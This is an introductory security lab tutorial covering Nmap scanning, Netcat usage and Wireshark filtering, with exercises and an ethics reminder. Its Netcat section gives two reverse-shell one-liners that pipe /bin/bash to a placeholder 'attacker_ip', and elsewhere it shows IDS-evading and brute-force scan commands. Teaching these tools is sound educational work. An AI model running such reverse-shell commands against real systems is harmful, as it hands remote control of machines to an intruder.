# Lab 04: Security Tools Introduction

## Introduction

Now that you understand Linux, the command line, and networking fundamentals, it's time to put that knowledge into practice with real security tools. This lab introduces the essential toolkit every security professional uses: Nmap for network discovery, Netcat for network communication, and Wireshark for packet analysis.

These three tools form the foundation of both offensive and defensive security work. Whether you're a penetration tester mapping a target network, a SOC analyst investigating suspicious traffic, or a system administrator securing your infrastructure, mastery of these tools is non-negotiable.

## Learning Objectives

- Use Nmap for network discovery and port scanning
- Understand different Nmap scan types and their purposes
- Use Netcat for network connections and data transfer
- Capture and analyze network traffic with Wireshark
- Apply filters to find relevant packets
- Combine tools for comprehensive network analysis

## Nmap - The Network Mapper

Nmap is the industry-standard tool for network exploration and security auditing. It discovers hosts, services, operating systems, and vulnerabilities across networks.

### Basic Nmap Syntax

```bash
nmap [scan type] [options] <target>
```

Targets can be specified as:
- Single IP: `192.168.1.1`
- IP range: `192.168.1.1-100`
- CIDR notation: `192.168.1.0/24`
- Hostname: `scanme.nmap.org`
- From file: `-iL targets.txt`

### Host Discovery

Before scanning ports, Nmap determines which hosts are online:

```bash
# Ping scan (no port scanning)
nmap -sn 192.168.1.0/24

# Skip host discovery (assume host is up)
nmap -Pn 192.168.1.1

# TCP SYN ping
nmap -PS22,80,443 192.168.1.1

# ICMP echo ping
nmap -PE 192.168.1.1

# ARP ping (local network only, very reliable)
nmap -PR 192.168.1.0/24
```

### Port Scanning Techniques

Each scan type has different characteristics and use cases:

#### TCP SYN Scan (Default, Stealthy)

```bash
nmap -sS 192.168.1.1
```

- Sends SYN, receives SYN-ACK (open) or RST (closed)
- Never completes TCP handshake
- Faster and less likely to be logged
- Requires root privileges

#### TCP Connect Scan (Full Connection)

```bash
nmap -sT 192.168.1.1
```

- Completes full TCP three-way handshake
- More easily detected and logged
- Works without root privileges

#### UDP Scan

```bash
nmap -sU 192.168.1.1
```

- Scans UDP ports (slower, less reliable)
- Essential for finding DNS, SNMP, DHCP services
- Often combined with TCP: `nmap -sS -sU`

#### Version Detection

```bash
nmap -sV 192.168.1.1
```

- Probes open ports to determine service/version
- Critical for identifying vulnerabilities
- Increases scan time but provides valuable intel

#### OS Detection

```bash
nmap -O 192.168.1.1
```

- Fingerprints the operating system
- Analyzes TCP/IP stack behavior
- Requires at least one open and one closed port

### Common Nmap Commands

```bash
# Quick scan of common ports
nmap 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1

# Scan port range
nmap -p 1-1000 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# Top 100 ports (faster)
nmap --top-ports 100 192.168.1.1

# Comprehensive scan (SYN + Version + OS + Scripts)
nmap -sS -sV -O -sC 192.168.1.1

# Aggressive scan (includes above + traceroute)
nmap -A 192.168.1.1

# Fast scan (fewer probes)
nmap -T4 192.168.1.1

# Stealth scan (slow, evades IDS)
nmap -T1 -sS -f 192.168.1.1
```

### Nmap Scripting Engine (NSE)

NSE extends Nmap with powerful scripts for vulnerability detection:

```bash
# Default scripts (safe, useful)
nmap -sC 192.168.1.1

# Specific script
nmap --script=http-headers 192.168.1.1

# Script categories
nmap --script=vuln 192.168.1.1       # Vulnerability detection
nmap --script=safe 192.168.1.1       # Safe scripts only
nmap --script=auth 192.168.1.1       # Authentication-related
nmap --script=discovery 192.168.1.1  # Host/service discovery

# Multiple scripts
nmap --script=http-headers,http-methods 192.168.1.1

# Wildcard matching
nmap --script="http-*" 192.168.1.1

# Script with arguments
nmap --script=http-brute --script-args userdb=users.txt 192.168.1.1
```

### Nmap Output Formats

Save results for later analysis:

```bash
# Normal output
nmap -oN scan.txt 192.168.1.1

# Grepable output (easy parsing)
nmap -oG scan.gnmap 192.168.1.1

# XML output (for tools)
nmap -oX scan.xml 192.168.1.1

# All formats
nmap -oA scan 192.168.1.1
```

### Reading Nmap Output

Understanding scan results:

```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.4 (protocol 2.0)
80/tcp    open     http        Apache httpd 2.4.48
443/tcp   open     ssl/https   Apache httpd 2.4.48
3306/tcp  filtered mysql
8080/tcp  closed   http-proxy
```

**Port States:**
- **open**: Service is accepting connections
- **closed**: Port is accessible but no service listening
- **filtered**: Firewall blocking probes; state unknown
- **unfiltered**: Port accessible but open/closed undetermined
- **open|filtered**: Cannot determine if open or filtered

## Netcat - The Swiss Army Knife

Netcat (nc) is a versatile networking utility for reading and writing data across network connections. It's essential for testing connectivity, transferring files, and creating simple servers.

### Basic Netcat Usage

```bash
# Connect to a server
nc hostname port

# Listen for connections
nc -l -p port

# Verbose mode (see connection details)
nc -v hostname port

# UDP instead of TCP
nc -u hostname port
```

### Port Scanning with Netcat

```bash
# Scan single port
nc -zv 192.168.1.1 22

# Scan port range
nc -zv 192.168.1.1 20-100

# Timeout after 1 second
nc -zv -w1 192.168.1.1 20-100
```

The `-z` flag performs a scan without sending data.

### Banner Grabbing

Identify services by connecting and reading their banners:

```bash
# Grab SSH banner
nc -v 192.168.1.1 22

# Grab HTTP headers
echo -e "HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Grab SMTP banner
nc -v mail.example.com 25
```

### File Transfer

Transfer files between systems:

**On receiving machine (listener):**
```bash
nc -l -p 4444 > received_file.txt
```

**On sending machine:**
```bash
nc 192.168.1.100 4444 < file_to_send.txt
```

### Simple Chat

Create a basic chat between two systems:

**Machine 1 (listener):**
```bash
nc -l -p 4444
```

**Machine 2 (connector):**
```bash
nc 192.168.1.100 4444
```

Type messages and press Enter to send.

### Reverse Shell

**Security Note**: This is a technique used in penetration testing. Only use on systems you own or have explicit permission to test.

**On attacker machine (listener):**
```bash
nc -l -p 4444
```

**On target machine:**
```bash
nc -e /bin/bash attacker_ip 4444
```

If `-e` isn't available (some netcat versions):
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

### Web Server Testing

Test HTTP servers manually:

```bash
# Connect to web server
nc example.com 80

# Type HTTP request
GET / HTTP/1.1
Host: example.com

# Press Enter twice
```

## Wireshark - Packet Analysis

Wireshark is the world's foremost network protocol analyzer. It captures packets from network interfaces and provides deep inspection of hundreds of protocols.

### Starting Wireshark

```bash
# Launch Wireshark GUI
wireshark

# Command-line version
tshark
```

### Capturing Traffic

1. Select the network interface (eth0, wlan0, lo)
2. Click the shark fin icon or double-click the interface
3. Traffic will start appearing in real-time
4. Click the red square to stop capture

### Wireshark Interface Layout

```
+----------------------------------------------------------+
| Menu Bar                                                  |
+----------------------------------------------------------+
| Filter Bar: [Display filter input]                        |
+----------------------------------------------------------+
| Packet List (summary of each packet)                      |
|   No. | Time | Source | Destination | Protocol | Info    |
+----------------------------------------------------------+
| Packet Details (protocol tree)                            |
|   > Frame                                                 |
|   > Ethernet II                                           |
|   > Internet Protocol                                     |
|   > Transmission Control Protocol                         |
|   > Application Data                                      |
+----------------------------------------------------------+
| Packet Bytes (raw hex and ASCII)                          |
+----------------------------------------------------------+
```

### Display Filters

Filters narrow down packets to what's relevant:

```
# Filter by IP address
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# Filter by port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Filter by protocol
http
dns
tcp
udp
icmp
arp
ssh

# HTTP specific
http.request
http.response
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.response.code == 404

# DNS specific
dns.qry.name == "example.com"
dns.flags.response == 1

# Combine filters
ip.addr == 192.168.1.1 && tcp.port == 80
http || dns
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Exclude traffic
!(arp || dns)
ip.addr != 192.168.1.1

# Contains string
http.host contains "google"
frame contains "password"
```

### Capture Filters (BPF Syntax)

Applied during capture to reduce file size:

```
# Capture only specific host
host 192.168.1.1

# Capture specific port
port 80

# Capture specific network
net 192.168.1.0/24

# Capture TCP only
tcp

# Combinations
host 192.168.1.1 and port 80
tcp port 80 or tcp port 443
```

### Following Streams

To see a complete conversation:

1. Right-click a packet
2. Select "Follow" > "TCP Stream" (or UDP/HTTP)
3. View the complete conversation in readable format

This is invaluable for:
- Reading HTTP requests/responses
- Extracting transferred files
- Understanding protocol exchanges

### Extracting Objects

Wireshark can extract files from captured traffic:

1. File > Export Objects > HTTP (or DICOM, IMF, SMB, TFTP)
2. View list of transferrable files
3. Select and save files

### Packet Statistics

Analyze traffic patterns:

- Statistics > Protocol Hierarchy (protocol breakdown)
- Statistics > Conversations (host pairs)
- Statistics > Endpoints (unique hosts)
- Statistics > HTTP > Requests (web traffic summary)

### Command-Line Wireshark (tshark)

```bash
# Capture 100 packets
tshark -c 100 -i eth0

# Capture with filter
tshark -i eth0 -f "port 80"

# Read capture file
tshark -r capture.pcap

# Apply display filter
tshark -r capture.pcap -Y "http.request"

# Extract specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# Output to file
tshark -i eth0 -w capture.pcap
```

## Combining Tools: Practical Workflow

Here's how these tools work together in a real engagement:

### Scenario: Network Reconnaissance

```bash
# Step 1: Discover live hosts on the network
nmap -sn 192.168.1.0/24

# Step 2: Scan for open ports on discovered hosts
nmap -sS -p- 192.168.1.50

# Step 3: Identify services and versions
nmap -sV -sC 192.168.1.50

# Step 4: Banner grab manually for verification
nc -v 192.168.1.50 22
nc -v 192.168.1.50 80

# Step 5: Capture traffic during interactions
# (Start Wireshark on the interface)
# Filter: ip.addr == 192.168.1.50
```

### Scenario: Service Investigation

```bash
# Step 1: Scan for web servers
nmap -p 80,443,8080,8443 192.168.1.0/24

# Step 2: Test HTTP manually
echo -e "GET / HTTP/1.1\r\nHost: 192.168.1.50\r\n\r\n" | nc 192.168.1.50 80

# Step 3: Capture HTTP traffic
# Wireshark filter: http && ip.addr == 192.168.1.50
# Follow TCP stream to see full requests/responses
```

## Hands-On Exercises

### Exercise 1: Network Discovery
1. Use Nmap to discover all live hosts on your local network
2. Record the IP addresses and MAC addresses found
3. Identify the manufacturer from MAC address prefixes

### Exercise 2: Port Scanning
1. Perform a TCP SYN scan on a target (use scanme.nmap.org for legal scanning)
2. Run a version detection scan on open ports
3. Save results in all three formats (normal, grepable, XML)

### Exercise 3: Service Verification
1. Use Netcat to manually connect to each open port
2. Grab banners from SSH, HTTP, and any other services
3. Compare with Nmap's version detection results

### Exercise 4: Traffic Capture
1. Start Wireshark on your main network interface
2. Generate HTTP traffic by browsing a website
3. Apply filter to show only your traffic
4. Follow a TCP stream to see complete HTTP conversation

### Exercise 5: Integration Challenge
1. Scan a target for open ports with Nmap
2. While scanning, capture all traffic in Wireshark
3. Analyze the captured packets to see how Nmap works
4. Identify SYN, SYN-ACK, and RST packets

## Security and Ethics

**Important Reminders:**

1. **Only scan systems you own or have permission to scan**
2. Unauthorized scanning is illegal in most jurisdictions
3. Use `scanme.nmap.org` for practice (Nmap's legal test target)
4. In corporate environments, always get written authorization
5. Be aware of intrusion detection systems that may log your activity

## Summary

You've learned the essential security tools:

- **Nmap**: Network discovery, port scanning, version detection, and scripting
- **Netcat**: Network connections, banner grabbing, file transfer, and testing
- **Wireshark**: Packet capture, protocol analysis, and traffic inspection

These tools work together to provide complete network visibility. Nmap tells you what's there, Netcat lets you interact with it, and Wireshark shows you exactly what's happening on the wire.

## Next Steps

Continue to [Lab Environment Setup](../05-lab-environment-setup/README.md) to configure the complete CyberLab Docker environment for hands-on practice.
